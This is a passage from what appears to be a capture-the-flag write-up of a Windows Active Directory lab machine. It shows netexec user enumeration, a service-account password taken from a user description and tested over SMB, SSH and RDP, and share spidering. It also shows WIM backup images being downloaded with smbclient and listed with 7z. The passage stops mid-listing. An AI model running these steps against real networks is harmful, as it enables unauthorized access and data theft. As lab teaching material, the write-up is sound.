SMB         shibuya.vl      445    AWSJPDC0522      Joe.Carter                    2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Lisa.Armstrong                2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Matthew.Owen                  2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Henry.Howe                    2025-02-16 10:23:51 0
SMB         shibuya.vl      445    AWSJPDC0522      Carol.Clarke                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Elizabeth.O'Neill             2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Marc.Davis                    2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Leon.Wells                    2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Natasha.Lane                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Bernard.Nelson                2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Hannah.Price                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Patrick.Thomas                2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Abdul.Clarke                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Hilary.Murphy                 2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Hugh.Higgins                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Rachel.Foster                 2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Alison.Jones                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Anne.Carr                     2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Victoria.Cook                 2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Jane.Taylor                   2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Karen.Carter                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Ronald.Lloyd                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Douglas.Humphreys             2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Louis.Barrett                 2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Rhys.Thompson                 2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Gareth.Moore                  2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Margaret.O'Connor             2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Natalie.Horton                2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Maurice.Curtis                2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Dennis.Bell                   2025-02-16 10:23:52 0
SMB         shibuya.vl      445    AWSJPDC0522      Antony.Marshall               2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Lewis.Edwards                 2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Reece.Young                   2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Gary.Parry                    2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Andrea.Gray                   2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Ann.Reed                      2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Robin.Kaur                    2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Bethany.Briggs                2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Donald.Coles                  2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      Martyn.Turner                 2025-02-16 10:23:53 0
SMB         shibuya.vl      445    AWSJPDC0522      [*] Enumerated 503 local users: SHIBUYA

```

The fourth line of output is svc\_autojoin, and there’s a non-intelligible string as the description, “K5&A6Dw9d8jrKWhV”.

### Validate Creds

That string works as creds with `netexec` on SMB (with or without `-k`):

```

oxdf@hacky$ netexec smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' -k
SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) 
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
oxdf@hacky$ netexec smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV'
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 

```

They don’t work for SSH, but `netexec` says they do for RDP:

```

oxdf@hacky$ netexec ssh shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV'
SSH         10.129.234.42   22     shibuya.vl       [*] SSH-2.0-OpenSSH_for_Windows_9.5
SSH         10.129.234.42   22     shibuya.vl       [-] svc_autojoin:K5&A6Dw9d8jrKWhV
oxdf@hacky$ netexec rdp shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV'
RDP         10.129.234.42   3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
RDP         10.129.234.42   3389   AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWh

```

I am not able to get them to connect.

## Shell as simon.watson

### SMB Shares

#### Enumerate Access

svc\_autojoin sees the same shares:

```

oxdf@hacky$ netexec smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' --shares
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.129.234.42   445    AWSJPDC0522      users           READ   

```

The differences is that svc\_autojoin can access `images$`.

#### Spider

I’ll use `--spider 'images$'` to get a file listing of the `images$` share (using `--regex .` to get all files):

```

oxdf@hacky$ netexec smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' --spider 'images$' --regex .
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         10.129.234.42   445    AWSJPDC0522      [*] Started spidering
SMB         10.129.234.42   445    AWSJPDC0522      [*] Spidering .
SMB         10.129.234.42   445    AWSJPDC0522      //10.129.234.42/images$/. [dir]
SMB         10.129.234.42   445    AWSJPDC0522      //10.129.234.42/images$/.. [dir]
SMB         10.129.234.42   445    AWSJPDC0522      //10.129.234.42/images$/AWSJPWK0222-01.wim [lastm:'2025-02-19 17:35' size:8264070]
SMB         10.129.234.42   445    AWSJPDC0522      //10.129.234.42/images$/AWSJPWK0222-02.wim [lastm:'2025-02-19 17:35' size:50660968]
SMB         10.129.234.42   445    AWSJPDC0522      //10.129.234.42/images$/AWSJPWK0222-03.wim [lastm:'2025-02-19 17:35' size:32065850]
SMB         10.129.234.42   445    AWSJPDC0522      //10.129.234.42/images$/vss-meta.cab [lastm:'2025-02-19 17:35' size:365686]
SMB         10.129.234.42   445    AWSJPDC0522      [*] Done spidering (Completed in 0.5584118366241455)

```

#### Exfil

I’ll connect with `smbclient` and save all four files:

```

oxdf@hacky$ smbclient -U shibuya.vl/svc_autojoin '//shibuya.vl/images$'
Password for [SHIBUYA.VL\svc_autojoin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 16 11:24:08 2025
  ..                                DHS        0  Wed Apr  9 00:09:45 2025
  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 11:23:41 2025
  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 11:23:45 2025
  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 11:23:47 2025
  vss-meta.cab                        A   365686  Sun Feb 16 11:22:37 2025

                5048575 blocks of size 4096. 1549504 blocks available
smb: \> prompt off
smb: \> mget *
getting file \AWSJPWK0222-01.wim of size 8264070 as AWSJPWK0222-01.wim (5423.6 KiloBytes/sec) (average 5423.6 KiloBytes/sec)
getting file \AWSJPWK0222-02.wim of size 50660968 as AWSJPWK0222-02.wim (4750.7 KiloBytes/sec) (average 4834.8 KiloBytes/sec)
getting file \AWSJPWK0222-03.wim of size 32065850 as AWSJPWK0222-03.wim (2711.9 KiloBytes/sec) (average 3789.4 KiloBytes/sec)
getting file \vss-meta.cab of size 365686 as vss-meta.cab (759.8 KiloBytes/sec) (average 3729.9 KiloBytes/sec)

```

### Images

#### Format

The three files are Windows imaging (WIM) images:

```

oxdf@hacky$ file AWSJPWK0222-0*
AWSJPWK0222-01.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup
AWSJPWK0222-02.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup
AWSJPWK0222-03.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup

```

These are disk images files created by Microsoft.

#### Reading wim

7zip can handle reading the files inside `.wim` files. I’ll use `7z l` to list the file in each. `AWSJPWK0222-01.wim` seems to have a `Users` directory, including `Administrator`, `simon.watson`, `Default`, and `Public`:

```

oxdf@hacky$ 7z l AWSJPWK0222-01.wim

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 8264070 bytes (8071 KiB)

Listing archive: AWSJPWK0222-01.wim
--
Path = AWSJPWK0222-01.wim
Type = wim
WARNING = Some files have incorrect reference count
Physical Size = 8264070
Size = 78387563
Packed Size = 8188162
Method = XPress:15
Cluster Size = 32768
Created = 2025-02-16 11:23:41.0431850
Modified = 2025-02-16 11:23:41.0431850
Comment = <WIM><TOTALBYTES>8263232</TOTALBYTES><IMAGE INDEX="1"><DIRCOUNT>829</DIRCOUNT><FILECOUNT>675</FILECOUNT><TOTALBYTES>88009447</TOTALBYTES><HARDLINKBYTES>0</HARDLINKBYTES><CREATIONTIME><HIGHPART>0x01DB8065</HIGHPART><LOWPART>0x3B2D336A</LOWPART></CREATIONTIME><LASTMODIFICATIONTIME><HIGHPART>0x01DB8065</HIGHPART><LOWPART>0x3B2D336A</LOWPART></LASTMODIFICATIONTIME><WIMBOOT>0</WIMBOOT><NAME>Backup01</NAME></IMAGE></WIM>
Version = 1.13
Multivolume = -
Volume = 1
Volumes = 1
Images = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-02-16 10:48:48 D....                            Administrator
2025-02-16 19:48:13 DRH..                            Default
2025-02-16 10:48:48 DR...                            Public
2025-02-16 11:15:52 D....                            simon.watson
2025-02-16 10:48:48 DR...                            Administrator/3D Objects
2025-02-16 10:48:46 D.H..                            Administrator/AppData
2025-02-16 10:48:48 DR...                            Administrator/Contacts
2025-02-16 10:48:48 DR...                            Administrator/Desktop
2025-02-16 10:48:49 DR...                            Administrator/Documents
2025-02-16 10:48:48 DR...                            Administrator/Downloads
2025-02-16 10:48:48 DR...                            Administrator/Favorites
2025-02-16 10:48:49 DR...                            Administrator/Links
2025-02-16 10:48:48 DR...                            Administrator/Music
2025-02-16 10:48:48 DR...                            Administrator/Pictures
2025-02-16 10:48:49 DR...                            Administrator/Saved Games
2025-02-16 10:48:49 DR...                            Administrator/Searches
2025-02-16 10:48:48 DR...                            Administrator/Videos
2025-02-16 11:14:06 D....                            Administrator/AppData/Local
2025-02-16 10:48:49 D....                            Administrator/AppData/LocalLow
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming
2025-02-16 10:48:52 D....                            Administrator/AppData/Local/ConnectedDevicesPlatform
2025-02-16 11:14:07 D....                            Administrator/AppData/Local/Microsoft
2025-02-16 10:49:01 D....                            Administrator/AppData/Local/Microsoft_Corporation
2025-02-16 11:11:03 D....                            Administrator/AppData/Local/Packages
2025-02-16 11:22:36 D....                            Administrator/AppData/Local/Temp
2025-02-16 10:48:52 D....                            Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator
2025-02-16 10:48:48 D..S.                            Administrator/AppData/Local/Microsoft/Credentials
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Feeds
2025-02-16 10:48:48 D.HS.                            Administrator/AppData/Local/Microsoft/Feeds Cache
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input
2021-05-08 08:34:49 D....                            Administrator/AppData/Local/Microsoft/InputPersonalization
2025-02-16 11:10:30 D....                            Administrator/AppData/Local/Microsoft/Internet Explorer
2025-02-16 10:59:25 D....                            Administrator/AppData/Local/Microsoft/Media Player
2025-02-16 11:14:07 D....                            Administrator/AppData/Local/Microsoft/PenWorkspace
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/PlayReady
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/Vault
2025-02-16 10:55:59 D....                            Administrator/AppData/Local/Microsoft/Windows
2021-05-08 08:20:26 D.HS.                            Administrator/AppData/Local/Microsoft/Windows Sidebar
2021-05-08 08:20:24 D..S.                            Administrator/AppData/Local/Microsoft/WindowsApps
2025-02-16 10:49:00 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/BrowserMetrics
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Safe Browsing
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/reports
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/js
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/wasm
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/af-ZA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-AE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-BH
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-DZ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-EG
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-IQ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-JO
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-KW
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-LB
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-LY
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-MA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-OM
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-QA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-SA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-SY
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-TN
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ar-YE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/az-Latn-AZ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/bg-BG
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/bn-BD
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ca-ES
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/cs-CZ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/da-DK
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/de-AT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/de-CH
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/de-DE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/de-LI
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/de-LU
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/el-GR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-029
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-AU
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-BZ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-CA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-GB
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-HK
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-ID
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-IE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-IN
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-JM
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-MY
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-NZ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-SG
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-TT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-ZA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/en-ZW
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-419
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-AR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-BO
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-CL
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-CO
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-CR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-DO
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-EC
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-ES
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-GT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-HN
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-MX
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-NI
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-PA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-PE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-PR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-PY
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-SV
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-US
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-UY
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/es-VE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/et-EE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/eu-ES
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fa-IR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fi-FI
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-029
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-BE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-CA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-CD
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-CH
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-CI
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-CM
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-FR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-HT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-LU
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-MA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-MC
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-ML
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-RE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/fr-SN
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/gl-ES
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ha-Latn-NG
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/he-IL
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/hi-IN
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/hr-BA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/hr-HR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/hu-HU
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/hy-AM
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/id-ID
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/it-CH
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/it-IT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ka-GE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/kk-KZ
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/lt-LT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/lv-LV
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/mk-MK
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ms-BN
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ms-MY
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/nb-NO
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/nl-BE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/nl-NL
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/pl-PL
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/pt-BR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/pt-PT
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ro-MD
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ro-RO
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/ru-RU
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sk-SK
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sl-SI
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sq-AL
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sr-Cyrl-BA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sr-Cyrl-ME
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sr-Cyrl-RS
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sr-Latn-BA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sr-Latn-ME
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sr-Latn-RS
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sv-FI
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/sv-SE
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/tr-TR
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/uk-UA
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/input/uz-Latn-UZ
2021-05-08 08:20:24 D....                            Administrator/AppData/Local/Microsoft/InputPersonalization/TrainedDataStore
2025-02-16 11:17:31 D....                            Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Internet Explorer/IECompatData
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Internet Explorer/TabRoaming
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Internet Explorer/Tracking Protection
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists
2025-02-16 10:59:25 D....                            Administrator/AppData/Local/Microsoft/Media Player/Transcoded Files Cache
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer/Desktop
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer/InPrivate
2025-02-16 10:48:48 D....                            Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer/InPrivate/Desktop
2025-02-16 10:48:47 D....                            Administrator/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28
2025-02-16 10:52:01 D....                            Administrator/AppData/Local/Microsoft/Windows/1033
2025-02-16 11:04:05 D....                            Administrator/AppData/Local/Microsoft/Windows/ActionCenterCache
2025-02-16 10:48:48 DR...                            Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts
2025-02-16 10:48:53 D....                            Administrator/AppData/Local/Microsoft/Windows/Burn
2025-02-16 11:16:06 D....                            Administrator/AppData/Local/Microsoft/Windows/Caches
2021-05-08 08:20:24 D....                            Administrator/AppData/Local/Microsoft/Windows/CloudStore
2025-02-16 11:10:30 D....                            Administrator/AppData/Local/Microsoft/Windows/Explorer
2025-02-16 10:55:59 D....                            Administrator/AppData/Local/Microsoft/Windows/Fonts
2021-05-08 08:20:24 D....                            Administrator/AppData/Local/Microsoft/Windows/GameExplorer
2025-02-16 11:18:05 D..S.                            Administrator/AppData/Local/Microsoft/Windows/History
2025-02-16 10:48:48 D.H..                            Administrator/AppData/Local/Microsoft/Windows/IECompatCache
2025-02-16 10:48:48 D.H..                            Administrator/AppData/Local/Microsoft/Windows/IECompatUaCache
